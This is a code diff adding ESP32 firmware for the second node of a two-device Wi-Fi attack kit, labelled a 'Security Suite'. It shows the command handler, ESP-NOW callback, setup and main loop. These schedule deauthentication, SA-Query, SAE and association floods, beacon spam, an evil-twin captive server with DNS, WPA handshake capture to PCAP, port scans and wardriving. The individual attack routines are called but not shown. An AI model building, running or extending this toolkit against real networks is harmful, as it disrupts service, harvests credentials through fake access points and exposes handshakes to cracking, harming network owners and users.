+      char buf[80]; snprintf(buf,sizeof(buf),"[Node2] Assoc flood → %s ch%d",bssidStr,(int)assocFloodChan);
+      sendToESP1(buf);
+    }
+  }
+  else if (strcmp(cmd,"wardrive start")==0) { wardrive=true;  sendToESP1("[Node2] Wardriving started."); }
+  else if (strcmp(cmd,"wardrive stop")==0)  { wardrive=false; sendToESP1("[Node2] Wardriving stopped."); }
+  else if (strncmp(cmd,"portscan ",9)==0) {
+    char ip[20]; int sp=1,ep=1024;
+    sscanf(cmd+9,"%19s %d %d",ip,&sp,&ep);
+    doPortScan(ip,sp,ep);
+  }
+  else if (strcmp(cmd,"status")==0) {
+    char b[160];
+    snprintf(b,sizeof(b),"[Node2] mon=%s dauth=%s bcn=%s evil=%s hs=%s sae=%s saq=%s afl=%s wd=%s ch=%d",
+      monitorRunning?"ON":"OFF", deauthRunning?"ON":"OFF", beaconRunning?"ON":"OFF",
+      evilTwinRunning?"ON":"OFF", hsRunning?"ON":"OFF", saeRunning?"ON":"OFF",
+      saQueryRunning?"ON":"OFF", assocFloodRunning?"ON":"OFF", wardrive?"ON":"OFF", lastChan);
+    sendToESP1(b);
+  }
+  else {
+    char b[100]; snprintf(b,sizeof(b),"[Node2] Unknown: %s",cmd); sendToESP1(b);
+  }
+}
+
+// ══════════════════════════════════════════════
+//  ESP-NOW RECEIVE CALLBACK
+// ══════════════════════════════════════════════
+void OnDataRecv(const esp_now_recv_info_t* info, const uint8_t* data, int len) {
+  if (len <= 0 || len >= CMD_LEN) return;
+  // Only accept new command if previous one was consumed
+  if (!hasPendingCmd) {
+    memcpy(pendingCmd, data, len);
+    pendingCmd[len] = '\0';
+    hasPendingCmd = true;
+  }
+}
+
+// ══════════════════════════════════════════════
+//  SETUP
+// ══════════════════════════════════════════════
+void setup() {
+  Serial.begin(115200);
+  delay(500);
+  Serial.println("\n\n==== ESP32 Node 2 — Security Suite ====");
+  WiFi.mode(WIFI_STA);
+  WiFi.disconnect();
+  delay(100);
+
+  Serial.println("╔══════════════════════════════════════════╗");
+  Serial.printf ("║  My MAC: %-32s║\n", WiFi.macAddress().c_str());
+  Serial.println("║  Paste above into esp1.ino ESP2_MAC[]    ║");
+  Serial.println("╚══════════════════════════════════════════╝");
+
+  if (esp_now_init()!=ESP_OK) { Serial.println("FATAL: ESP-NOW failed"); while(1)delay(1000); }
+  esp_now_register_recv_cb(OnDataRecv);
+  memset(&peerInfo,0,sizeof(peerInfo));
+  memcpy(peerInfo.peer_addr,ESP1_MAC,6);
+  peerInfo.channel=1; peerInfo.encrypt=false; peerInfo.ifidx=WIFI_IF_STA;
+  if (esp_now_add_peer(&peerInfo)!=ESP_OK) Serial.println("ERROR: peer add failed");
+  else Serial.println("ESP-NOW peer (Node 1) registered.");
+  Serial.println("Node 2 ready.");
+}
+
+// ══════════════════════════════════════════════
+//  LOOP
+// ══════════════════════════════════════════════
+void loop() {
+  // Process command from ESP1 (clear flag BEFORE processing so new cmds can arrive)
+  if (hasPendingCmd) {
+    char local[CMD_LEN];
+    memcpy(local, pendingCmd, CMD_LEN);
+    hasPendingCmd = false;  // clear AFTER copy, BEFORE processing
+    processCommand(local);
+  }
+
+  unsigned long now = millis();
+
+  // Monitor stats
+  if (monitorRunning && now-lastStatTime>=STAT_MS) {
+    lastStatTime=now;
+    uint32_t c=pktCount; pktCount=0;
+    char b[80]; snprintf(b,sizeof(b),"[Monitor] pkts/s=%lu RSSI=%d ch=%d",
+      (unsigned long)c*1000/STAT_MS,(int)lastRSSI,(int)lastChan);
+    sendToESP1(b);
+  }
+
+  // Handshake EAPOL staging (ISR → loop)
+  if (hsPktReady && hsRunning) {
+    hsPktReady=false;
+    appendPcapPkt(hsTmpPkt, hsTmpLen);
+    hsEapolCount++;
+    char b[60]; snprintf(b,sizeof(b),"[Handshake] EAPOL frame #%d captured!",hsEapolCount);
+    sendToESP1(b);
+    if (hsEapolCount>=4) {
+      sendToESP1("[Handshake] 4-way handshake complete! Click 'Download PCAP'.");
+    }
+  }
+
+  // Deauth flood
+  if (deauthRunning && now-lastDeauthTime>=DEAUTH_MS) {
+    lastDeauthTime=now;
+    doDeauth();
+  }
+
+  // SA-Query flood (Management Frame Flooding)
+  if (saQueryRunning && now-lastSaQueryTime>=SAQUERY_MS) {
+    lastSaQueryTime=now;
+    doSaQueryFlood();
+  }
+
+  // Assoc Response flood
+  if (assocFloodRunning && now-lastAssocFloodTime>=ASSOCFLOOD_MS) {
+    lastAssocFloodTime=now;
+    doAssocFlood();
+  }
+
+  // SAE flood
+  if (saeRunning && now-lastSaeTime>=SAE_MS) {
+    lastSaeTime=now;
+    doSaeFlood();
+  }
+
+  // Beacon spam
+  if (beaconRunning && now-lastBeaconTime>=BEACON_MS) {
+    lastBeaconTime=now;
+    doBeacon();
+  }
+
+  // Evil Twin server/DNS
+  if (evilTwinRunning) {
+    if (evilServer) evilServer->handleClient();
+    if (dnsServer)  dnsServer->processNextRequest();
+  }
+
+  // Wardriving
+  if (wardrive && now-lastWdTime>=WD_INTERVAL) {
+    lastWdTime=now;
+    doWardrive();
+    reinitEspNow();
+  }
+
+  delay(5);
+}
